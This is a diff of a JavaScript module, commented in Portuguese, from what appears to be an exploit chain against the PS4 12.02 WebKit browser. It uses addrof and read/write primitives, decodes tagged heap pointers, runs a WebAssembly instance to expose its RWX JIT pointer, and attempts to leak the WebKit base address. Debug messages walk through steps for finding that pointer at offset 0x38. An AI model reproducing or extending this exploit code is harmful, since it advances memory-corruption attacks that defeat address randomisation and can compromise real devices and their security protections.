@@ -1,8 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v110 - R70 com WASM Code Corrigido)
+// js/script3/testArrayBufferVictimCrash.mjs (v111 - R71 - Foco na Depuração de Heap/WASM)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Corrigido o módulo WebAssembly para garantir compilação e instanciação.
-// O foco principal continua sendo o vazamento de endereço base do WebKit via instância de WebAssembly.
+// Confirmado que o módulo WebAssembly compila e instancia.
+// A poluição de heap persiste, sobrepondo o ponteiro RWX da instância WASM.
+// O script sugere fortemente a depuração de baixo nível como o próximo passo crucial.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,7 +15,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v110_R70_WasmCodeFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v111_R71_DeepHeapWasmDebug";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -50,18 +51,12 @@ function decodePS4Pointer(encoded) {
 
     const offset_adv_int64 = new AdvancedInt64(offset_low, offset_high);
 
-    // Na análise, foi sugerido que 0x40 é a tag para objetos JS.
-    // Para ponteiros WASM/JIT, a tag pode ser diferente ou o ponteiro já pode ser "bruto".
-    // Se o ponteiro parece ser da região do kernel ou espaço de usuário alto (0x4...), não decodificamos a tag.
-    // Se ele tem uma tag 0x40, tentamos decodificar com a base do heap.
-    // Esta lógica é uma heurística baseada na análise.
-
     if (current_tag === 0x40) { // Se a tag 0x40 está presente
         logS3(`    [decodePS4Pointer] Ponteiro com tag 0x40 detectada. Decodificando com PS4_HEAP_BASE...`, "debug");
         return PS4_HEAP_BASE.add(offset_adv_int64); // Aplica a base
     } else if (encoded.high() > 0x40000000 || encoded.high() === 0) { // Se já parece um endereço alto ou 0, não mexer.
         logS3(`    [decodePS4Pointer] Ponteiro com high-word > 0x40000000 ou 0, ou tag diferente (${toHex(current_tag)}). Retornando como está.`, "debug");
-        return encoded; // Retorna o valor original
+        return encoded;
     } else { // Caso contrário, talvez seja um ponteiro compactado sem a tag 0x40 esperada. Retornar como está para não corromper.
         logS3(`    [decodePS4Pointer] Ponteiro com tag incomum (${toHex(current_tag)}). Retornando como está.`, "debug");
         return encoded;
@@ -233,7 +228,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             try {
                 const wasmModule = await WebAssembly.compile(wasmCodeBuffer);
                 wasmInstance = new WebAssembly.Instance(wasmModule);
-                logS3("  WebAssembly Módulo e Instância criados com sucesso.", "good");
+                // Call the exported function to potentially trigger JIT compilation
+                // This might be crucial for the RWX pointer to be valid.
+                wasmInstance.exports.run(); 
+                logS3("  WebAssembly Módulo e Instância criados e função 'run' executada com sucesso.", "good");
             } catch (wasm_e) {
                 logS3(`  ERRO ao compilar/instanciar WebAssembly: ${wasm_e.message}`, "critical");
                 throw new Error(`Falha no WebAssembly: ${wasm_e.message}`);
@@ -335,13 +333,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     if (!final_result.webkit_leak_details.success) {
         logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
         logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou. Verifique os logs acima para o motivo exato.", "critical");
-        logS3("A falha mais recente indica um problema com o WebAssembly ou, se essa etapa for superada, um problema de reutilização de heap ou proteções de alocação/ponteiros no PS4 12.02.", "critical");
+        logS3("A falha mais recente indica um problema de reutilização de heap ou proteções de alocação/ponteiros no PS4 12.02.", "critical");
         logS3("RECOMENDAÇÃO: A única forma de avançar é com depuração de baixo nível. Use um depurador (como GDB/LLDB) conectado ao processo do WebKit na PS4.", "critical");
-        logS3("1. **Verifique a compilação WASM:** Se o erro persistir, o buffer WASM pode não ser compatível com o ambiente. Tente um módulo WASM ainda mais simples ou valide-o em um ambiente WebKit semelhante.", "critical");
-        logS3("2. **Inspecione o heap após WASM:** Se a compilação for bem-sucedida, execute o exploit até a FASE 5.", "critical");
-        logS3("3. Interrompa a execução após a instância WASM ser criada. Inspecione a memória em seu endereço (wasm_instance_addr) e no offset 0x38 para o rwx_ptr.", "critical");
-        logS3("4. Verifique o conteúdo desses ponteiros e tente determinar sua natureza (ponteiro real, tag, lixo).", "critical");
-        logS3("5. Se o rwx_ptr parecer válido, tente escanear a memória ao redor dele em busca de assinaturas de funções conhecidas do WebKit (o offset do 'JSC::JSObject::put' é um bom candidato).", "critical");
+        logS3("1. **Inspecione o heap após WASM:** Execute o exploit até a FASE 5.", "critical");
+        logS3("2. Interrompa a execução após a instância WASM ser criada. Inspecione a memória em seu endereço (wasm_instance_addr) e no offset 0x38 para o rwx_ptr.", "critical");
+        logS3("3. Verifique o conteúdo desses ponteiros e tente determinar sua natureza (ponteiro real, tag, lixo).", "critical");
+        logS3("4. Se o rwx_ptr parecer válido, tente escanear a memória ao redor dele em busca de assinaturas de funções conhecidas do WebKit (o offset do 'JSC::JSObject::put' é um bom candidato).", "critical");
         logS3("Isso o ajudará a entender o layout do heap/WASM JIT e encontrar uma estratégia de alocação/vazamento que funcione ou confirmar a persistência do problema.", "critical");
         logS3("======================================================", "critical");
     }
